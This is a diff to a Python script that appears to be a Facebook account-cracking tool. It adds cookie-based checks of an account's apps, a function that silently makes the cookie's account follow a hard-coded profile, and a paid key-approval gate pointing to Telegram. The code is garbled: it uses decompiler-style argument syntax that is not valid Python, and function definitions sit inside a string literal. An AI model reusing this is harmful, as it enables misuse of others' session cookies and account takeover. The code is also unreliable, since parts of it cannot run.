@@ -24,6 +24,41 @@ time.sleep(5)
 os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChaware Bka")
 #------------------[ KakTarani ]-------------------#
+def cek_apk(session,coki):
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://m.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+
+           
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
@@ -193,7 +228,7 @@ def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                         
           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⠒⠒⠒⠒⠒⠒⠒⠒⢲⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⣄⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⡸⠁⠀⠀⠀⠀⠀⠘⡄⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -227,9 +262,37 @@ logo ="""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
                                                                                                                                                                  
                                                                                                                                                                  
-                                                                                                                                                                 
-                                               
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
+ \033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
+def shoha_menu(): 
+    UMO="3ala" 
+    uuid = str(os.geteuid()) + str(os.getlogin())  
+    id = "5".join(uuid) 
+    print(logo) 
+    ali=requests.get("").text 
+    if id in ali: 
+        Main() 
+    else: 
+        os.system("clear") 
+        os.system("xdg-open https://t.me/CodeManCarcker") 
+        time.sleep(3.0) 
+         
+        os.system("clear") 
+        print(logo) 
+        print("\t\033[1;32   [\033[1;32m\033[1;32m First Get Approvel\033[00m\033[1;30m]") 
+        print ("") 
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;32m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘") 
+        print ("") 
+        print("                Your Key is Not Approved ") 
+        print("               Copy And Send Key To Admin") 
+        print ("") 
+        print (" Your Key : "+UMO+id) 
+        print ("\n") 
+        name = input(" Your Name : ") 
+        print ("") 
+        input(" Press Enter To Send Key") 
+        os.system("xdg-open https://t.me/KakTarani") 
+        shoha_menu()    
+shoha_menu()
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;41m        [ WORKING MOBILE DATA AND WIFI ALSO ]         \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
